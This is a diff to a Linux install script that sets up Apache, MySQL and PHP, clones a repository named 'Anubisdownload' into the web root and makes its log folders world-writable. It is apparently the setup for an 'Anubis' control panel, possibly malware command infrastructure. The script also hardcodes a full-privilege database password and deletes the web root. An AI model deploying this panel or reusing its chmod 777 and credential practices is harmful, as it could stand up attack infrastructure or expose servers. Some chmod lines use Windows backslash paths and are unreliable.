@@ -5,6 +5,7 @@ apt install zlib1g
 apt install zlib1g-dev
 apt -y install software-properties-common
 add-apt-repository ppa:ondrej/php
+apt install apache2
 apt install mysql-server php7.0 php7.0-mysql php7.0-json php7.0-cli php7.0-gd php7.0-mbstring php7.0-xml
 cd /var/run
 service mysql restart
@@ -14,12 +15,12 @@ CREATE DATABASE `YW51YmlzZGI`;
 CREATE USER 'anubisroot'@'localhost' IDENTIFIED BY 'd2Vyd2Vxc2Q';
 GRANT ALL PRIVILEGES ON *.* TO 'anubisroot'@'localhost';
 FLUSH PRIVILEGES;
-cd /
+cd /var/www
+rm -rf html
 git clone https://github.com/CubRube/Anubisdownload
-mv Anubisdownload htmlanubis
-chmod 777 htmlanubis
-cd /htmlanubis
-mv phpmyadmin /htmlphpmyadmin
+mv Anubisdownload html
+chmod 755 html
+cd /var/www/html
 mysql -u root -p YW51YmlzZGI < database.sql
 chmod 777 c2Zkc2RmYXNkYXNzZGE\application\websocket\*.*
 chmod 777 c2Zkc2RmYXNkYXNzZGE\application\websocket\sound\*.*
@@ -29,11 +30,7 @@ chmod 777 c2Zkc2RmYXNkYXNzZGE\application\datalogs\*.*
 chmod 777 c2Zkc2RmYXNkYXNzZGE\application\datalogs\files\*.*
 chmod 777 c2Zkc2RmYXNkYXNzZGE\application\datalogs\logs\*.*
 chmod 777 c2Zkc2RmYXNkYXNzZGE\application\datalogs\numers\*.*
-cd /
-chmod 777 htmlphpmyadmin
-PHPMYADMIN ANUBIS START
-cd /htmlphpmyadmin && screen php -s 127.0.0.1:8081 (NO CTRL + C)
-cd /htmlanubis && screen php -s 127.0.0.1:80 (NO CTRL + C)
+
 
 
 
